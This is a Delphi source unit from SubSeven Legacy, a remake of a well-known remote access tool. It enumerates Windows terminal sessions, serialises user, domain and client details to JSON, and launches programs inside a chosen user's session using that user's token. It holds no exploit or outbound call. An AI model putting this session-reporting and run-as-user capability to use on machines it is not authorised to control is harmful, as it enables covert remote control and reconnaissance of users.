{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit Sub7.Core.Windows.Sessions.Enum;

interface

uses Winapi.Windows, Sub7.Core.OOP.Interfaces, XSuperObject, Generics.Collections;

const WTS_CURRENT_SERVER_HANDLE : THandle = 0;

type
  WTS_INFO_CLASS = (
                      WTSInitialProgram,
                      WTSApplicationName,
                      WTSWorkingDirectory,
                      WTSOEMId,
                      WTSSessionId,
                      WTSUserName,
                      WTSWinStationName,
                      WTSDomainName,
                      WTSConnectState,
                      WTSClientBuildNumber,
                      WTSClientName,
                      WTSClientDirectory,
                      WTSClientProductId,
                      WTSClientHardwareId,
                      WTSClientAddress,
                      WTSClientDisplay,
                      WTSClientProtocolType,
                      WTSIdleTime,
                      WTSLogonTime,
                      WTSIncomingBytes,
                      WTSOutgoingBytes,
                      WTSIncomingFrames,
                      WTSOutgoingFrames,
                      WTSClientInfo,
                      WTSSessionInfo,
                      WTSSessionInfoEx,
                      WTSConfigInfo,
                      WTSValidationInfo,
                      WTSSessionAddressV4,
                      WTSIsRemoteSession
  );
  TWtsInfoClass = WTS_INFO_CLASS;
  PWtsInfoClass = ^TWtsInfoClass;

  WTS_CONNECTSTATE_CLASS = (
                              WTSActive,
                              WTSConnected,
                              WTSConnectQuery,
                              WTSShadow,
                              WTSDisconnected,
                              WTSIdle,
                              WTSListen,
                              WTSReset,
                              WTSDown,
                              WTSInit
  );
  TWtsConnectStateClass = WTS_CONNECTSTATE_CLASS;
  PWtsConnectStateClass = ^TWtsConnectStateClass;

  WTS_SESSION_INFO = record
    SessionId       : DWORD;
    pWinStationName : LPWSTR;
    State           : WTS_CONNECTSTATE_CLASS;
  end;
  PWTS_SESSION_INFO = ^WTS_SESSION_INFO;
  TWtsSessionInfo   = WTS_SESSION_INFO;
  PWtsSessionInfo   = ^TWtsSessionInfo;

  var WTSEnumerateSessionsW : function(
                                        hServer           : THandle;
                                        Reserved          : DWORD;
                                        Version           : DWORD;
                                        var ppSessionInfo : PWtsSessionInfo;
                                        var pCount        : DWORD
      ) : BOOL; stdcall;

      WTSQuerySessionInformationW : function(
                                              hServer            : THandle;
                                              SessionId          : DWORD;
                                              WTSInfoClass       : Cardinal;
                                              var ppBuffer       : Pointer;
                                              var pBytesReturned : DWORD
      ) : BOOL; stdcall;

      WTSFreeMemory : procedure(
                                  pMemory: Pointer
      ); stdcall;

      WTSQueryUserToken : function(
                                    SessionId: ULONG;
                                    var phToken: THANDLE
      ): BOOL; stdcall;

      {
        @Exports
      }
      procedure RunInCurrentSession(const AProgram : String; const ACommand : String = '');
      procedure RunInSession(const ASessionId : Cardinal; const AProgram : String; ACommand : String = '');
      function GetActiveTerminalSessionId() : Integer;

  type
    TS7SessionInformation = class(TInterfacedObject, IS7Serializable)
    private
      FActive      : Boolean;
      FUserName    : String;
      FDomainName  : String;
      FIsRemote    : Boolean;
      FSessionId   : Integer;
      FStationName : String;
      FState       : TWtsConnectStateClass;
      FClientName  : String;
    public
      {@C}
      constructor Create(const ASerializedObject : ISuperObject = nil);

      {@M}
      function Serialize() : ISuperObject;
      procedure DeSerialize(const ASerializedObject : ISuperObject);

      {@G/S}
      property Active      : Boolean               read FActive      write FActive;
      property UserName    : String                read FUserName    write FUserName;
      property DomainName  : String                read FDomainName  write FDomainName;
      property IsRemote    : Boolean               read FIsRemote    write FIsRemote;
      property SessionId   : Integer               read FSessionId   write FSessionId;
      property StationName : String                read FStationName write FStationName;
      property State       : TWtsConnectStateClass read FState       write FState;
      property ClientName  : String                read FClientName  write FClientName;
    end;

    TS7EnumTerminalSessions = class(TInterfacedObject, IS7Serializable, IS7Enumerator)
    private
      FItems : TObjectList<TS7SessionInformation>;

      {@M}
      procedure EnumSessions();
    public
      {@M}
      function Refresh() : Integer;
      procedure Clear();

      function Serialize() : ISuperObject;
      procedure DeSerialize(const ASerializedObject : ISuperObject);

      {@C}
      constructor Create(const AOwnsObject : Boolean; const ARefresh : Boolean = True);
      destructor Destroy(); override;

      {@G}
      property Items : TObjectList<TS7SessionInformation> read FItems;
    end;

implementation

uses Sub7.Core.Exceptions, System.SysUtils, Sub7.Core.Bundle;

var WTS_INITIALIZED : Boolean = False;
    hWTSAPI32       : THandle;

{+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


  Local


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}

{-------------------------------------------------------------------------------
  Run application in session by its session id
-------------------------------------------------------------------------------}
procedure RunInSession(const ASessionId : Cardinal; const AProgram : String; ACommand : String = '');
var hToken       : THandle;
    AStartupInfo : TStartupInfo;
    AProcessInfo : TProcessInformation;
begin
  if not WTS_INITIALIZED then
    raise ES7SystemException.Create('WTS Library not initialized.');
  ///

  ZeroMemory(@AStartupInfo, SizeOf(TStartupInfo));
  AStartupInfo.cb := SizeOf(TStartupInfo);
  AStartupInfo.lpDesktop := nil;
  ///

  ZeroMemory(@AProcessInfo, SizeOf(TProcessInformation));

  if not WTSQueryUserToken(ASessionId, hToken) then
    raise ES7WindowsException.Create('WTSQueryUserToken');


  if ACommand <> '' then
    ACommand := Format('"%s" %s', [AProgram, ACommand])
  else
    ACommand := AProgram;

  UniqueString(ACommand);

  if not CreateProcessAsUserW(
                                hToken,
                                nil,
                                PWideChar(ACommand),
                                nil,
                                nil,
                                False,
                                0,
                                nil,
                                nil,
                                AStartupInfo,
                                AProcessInfo
  ) then
    raise ES7WindowsException.Create('CreateProcessAsUserW');
end;

{-------------------------------------------------------------------------------
  Run application in current user terminal session
-------------------------------------------------------------------------------}
procedure RunInCurrentSession(const AProgram : String; const ACommand : String = '');
begin
  RunInSession(
                GetActiveTerminalSessionId(),
                AProgram,
                ACommand
  );
end;

{-------------------------------------------------------------------------------
  Get Active Terminal Session Id
-------------------------------------------------------------------------------}
function GetActiveTerminalSessionId() : Integer;
var ASessions     : PWtsSessionInfo;
    ASession      : PWtsSessionInfo;
    ASessionCount : Cardinal;
    I             : Integer;
begin
  if not WTS_INITIALIZED then
    raise ES7SystemException.Create('WTS Library not initialized.');
  ///

  if not WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, ASessions, ASessionCount) then
    raise ES7WindowsException.Create('WTSEnumerateSessions');
  try
    if (ASessionCount = 0) then
      raise ES7SystemException.Create('No session found.');

    ASession := ASessions;
    for I := 0 to ASessionCount -1 do begin
      try
        if ASession^.State = WTSActive then
          Exit(ASession^.SessionId);
      finally
        Inc(ASession);
      end;
    end;

    ///
    raise ES7SystemException.Create('No active terminal session found.');
  finally
    WTSFreeMemory(ASessions);
  end;
end;

{+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


  TS7EnumTerminalSessions


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}

{-------------------------------------------------------------------------------
  Enumerate Sessions
-------------------------------------------------------------------------------}
procedure TS7EnumTerminalSessions.EnumSessions();
var ASessions     : PWtsSessionInfo;
    ASession      : PWtsSessionInfo;
    ASessionCount : Cardinal;
    I             : Integer;
    ASessionInfo  : TS7SessionInformation;

    procedure GetInformation(const AInfoClass : TWTSInfoClass; var pBuffer : Pointer; var ABufferSize : Cardinal);
    begin
      ABufferSize := 0;
      ///

      if not WTSQuerySessionInformationW(
                                          WTS_CURRENT_SERVER_HANDLE,
                                          ASession^.SessionId,
                                          Integer(AInfoClass),
                                          pBuffer,
                                          ABufferSize
      ) then
        raise ES7WindowsException.Create('WTSQuerySessionInformationW');
    end;

    { --> Str }
    function GetStringInformation(const AInfoClass : TWTSInfoClass) : String;
    var pBuffer     : Pointer;
        ABufferSize : Cardinal;
        AValue      : String;
    begin
      result := '';

      GetInformation(AInfoClass, pBuffer, ABufferSize);

      SetString(AValue, PWideChar(pBuffer), ABufferSize div 2);

      if Length(Trim(AValue)) > 0 then
        result := AValue;

      WTSFreeMemory(pBuffer);
    end;

    { --> Int }
    function GetIntInformation(const AInfoClass : TWTSInfoClass) : DWORD;
    var pBuffer     : Pointer;
        ABufferSize : Cardinal;
    begin
      GetInformation(AInfoClass, pBuffer, ABufferSize);

      result := PDWORD(pBuffer)^;

      WTSFreeMemory(pBuffer);
    end;

    { --> Bool }
    function GetBoolInformation(const AInfoClass : TWTSInfoClass) : BOOL;
    var pBuffer     : Pointer;
        ABufferSize : Cardinal;
    begin
      GetInformation(AInfoClass, pBuffer, ABufferSize);

      result := (PByte(pBuffer)^ = 1);

      WTSFreeMemory(pBuffer);
    end;

begin
  if not WTS_INITIALIZED then
    raise ES7SystemException.Create('WTS Library not initialized.');
  ///

  if not WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, ASessions, ASessionCount) then
    raise ES7WindowsException.Create('WTSEnumerateSessions');
  try
    if ASessionCount = 0 then
      raise ES7SystemException.Create('No session found.');

    ASession := ASessions;
    for I := 0 to ASessionCount -1 do begin
      try
        try
          ASessionInfo := TS7SessionInformation.Create();

          { Get Sesion Information }
          ASessionInfo.Active      := (ASession^.State = WTSActive);
          ASessionInfo.State       := ASession^.State;
          ASessionInfo.SessionId   := ASession.SessionId;
          ASessionInfo.UserName    := GetStringInformation(WTSUserName);
          ASessionInfo.DomainName  := GetStringInformation(WTSDomainName);
          ASessionInfo.IsRemote    := GetBoolInformation(WTSIsRemoteSession);
          ASessionInfo.StationName := GetStringInformation(WTSWinStationName);
          ASessionInfo.ClientName  := GetStringInformation(WTSClientName);

          ///
          FItems.Add(ASessionInfo);
        except
          on E : Exception do begin
            if Assigned(ASessionInfo) then
              FreeAndNil(ASessionInfo);
          end;
        end;
      finally
        Inc(ASession); // Next Session Record
      end;
    end;
  finally
    WTSFreeMemory(ASessions);
  end;
end;

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TS7EnumTerminalSessions.Create(const AOwnsObject : Boolean; const ARefresh : Boolean = True);
begin
  inherited Create();
  ///

  FItems := TObjectList<TS7SessionInformation>.Create(AOwnsObject);

  if ARefresh then
    self.Refresh();
end;

{-------------------------------------------------------------------------------
  ___destructor
-------------------------------------------------------------------------------}
destructor TS7EnumTerminalSessions.Destroy();
begin
  if Assigned(FItems) then
    FreeAndNil(FItems);

  ///
  inherited Destroy();
end;

{-------------------------------------------------------------------------------
  ___refresh
-------------------------------------------------------------------------------}
function TS7EnumTerminalSessions.Refresh() : Integer;
begin
  FItems.Clear();
  ///

  self.EnumSessions();

  ///
  result := FItems.Count;
end;

{-------------------------------------------------------------------------------
  ___clear
-------------------------------------------------------------------------------}
procedure TS7EnumTerminalSessions.Clear();
begin
  FItems.Clear();
end;

{-------------------------------------------------------------------------------
  ___serialize
-------------------------------------------------------------------------------}
function TS7EnumTerminalSessions.Serialize() : ISuperObject;
var ASessionInfo : TS7SessionInformation;
    ANodes       : ISuperArray;
    ANode        : ISuperObject;
begin
  result := nil;
  ///

  if not Assigned(FItems) then
    Exit();
  ///

  if FItems.Count = 0 then
    Exit();
  ///

  ANodes := TSuperArray.Create();

  for ASessionInfo in FItems do begin
    try
      ANode := ASessionInfo.Serialize();
    except
      {Ignore}
    end;

    ///
    ANodes.Add(ANode);
  end;

  result := TSuperObject.Create();

  result.A['sessions'] := ANodes;
end;

{-------------------------------------------------------------------------------
  ___deserialize
-------------------------------------------------------------------------------}
procedure TS7EnumTerminalSessions.DeSerialize(const ASerializedObject : ISuperObject);
var ANodes       : ISuperArray;
    I            : Integer;
    ASessionInfo : TS7SessionInformation;
begin
  FItems.Clear();

  if not Assigned(ASerializedObject) then
    raise ES7DeserializationError.Create(ERR_MISSING_INSTANCE);

  if not ASerializedObject.Contains('sessions') then
    raise ES7DeserializationError.Create(ERR_INVALID_DATA);

  ANodes := ASerializedObject.A['sessions'];

  for I := 0 to ANodes.Length -1 do begin
    try
      ASessionInfo := TS7SessionInformation.Create(ANodes.O[I]);

      ///
      FItems.Add(ASessionInfo);
    except
      { Ignore }
    end;
  end;
end;

{+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


  TS7SessionInformation


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}

{-------------------------------------------------------------------------------
  ___constructor
-------------------------------------------------------------------------------}
constructor TS7SessionInformation.Create(const ASerializedObject : ISuperObject = nil);
begin
  FActive      := False;
  FUserName    := '';
  FDomainName  := '';
  FSessionId   := -1;
  FIsRemote    := False;
  FStationName := '';
  FState       := WTSDisconnected;
  FClientName  := '';

  ///
  if Assigned(ASerializedObject) then
    self.DeSerialize(ASerializedObject);
end;

{-------------------------------------------------------------------------------
  ___serialize
-------------------------------------------------------------------------------}
function TS7SessionInformation.Serialize() : ISuperObject;
begin
  result := TSuperObject.Create();
  ///

  result.B['active']     := FActive;
  result.I['session_id'] := FSessionId;
  result.B['remote']     := FIsRemote;
  result.I['state']      := Integer(FState);
  ///

  if FUserName <> '' then
    result.S['username'] := FUserName;

  if FDomainName <> '' then
    result.S['domain'] := FDomainName;

  if FClientName <> '' then
    result.S['client_name'] := FClientName;

  if FStationName <> '' then
    result.S['station_name'] := FStationName;
end;

{-------------------------------------------------------------------------------
  ___deserialize
-------------------------------------------------------------------------------}
procedure TS7SessionInformation.DeSerialize(const ASerializedObject : ISuperObject);
begin
  if not Assigned(ASerializedObject) then
    raise ES7DeserializationError.Create(ERR_MISSING_INSTANCE);

  if not ASerializedObject.Contains('active')     or
     not ASerializedObject.Contains('session_id') or
     not ASerializedObject.Contains('remote')     or
     not ASerializedObject.Contains('state')
  then
    raise ES7DeserializationError.Create(ERR_INVALID_DATA);
  ///

  FActive    := ASerializedObject.B['active'];
  FSessionId := ASerializedObject.I['session_id'];
  FIsRemote  := ASerializedObject.B['remote'];
  FState     := TWtsConnectStateClass(ASerializedObject.I['state']);

  if ASerializedObject.Contains('username') then
    FUserName := ASerializedObject.S['username'];

  if ASerializedObject.Contains('domain') then
    FDomainName := ASerializedObject.S['domain'];

  if ASerializedObject.Contains('client_name') then
    FClientName := ASerializedObject.S['client_name'];

  if ASerializedObject.Contains('station_name') then
    FStationName := ASerializedObject.S['station_name'];
end;

{+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
  Init / Finit Required API's
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
initialization
  hWTSAPI32 := LoadLibrary('WTSAPI32.DLL');
  if hWTSAPI32 = 0 then
    Exit();

  @WTSEnumerateSessionsW       := GetProcAddress(hWTSAPI32, 'WTSEnumerateSessionsW');
  @WTSQuerySessionInformationW := GetProcAddress(hWTSAPI32, 'WTSQuerySessionInformationW');
  @WTSFreeMemory               := GetProcAddress(hWTSAPI32, 'WTSFreeMemory');
  @WTSQueryUserToken           := GetProcAddress(hWTSAPI32, 'WTSQueryUserToken');

  WTS_INITIALIZED := Assigned(WTSEnumerateSessionsW)       and
                     Assigned(WTSQuerySessionInformationW) and
                     Assigned(WTSFreeMemory);

finalization
  if hWTSAPI32 <> 0 then
    FreeLibrary(hWTSAPI32);

  @WTSEnumerateSessionsW       := nil;
  @WTSQuerySessionInformationW := nil;
  @WTSFreeMemory               := nil;
  @WTSQueryUserToken           := nil;

end.
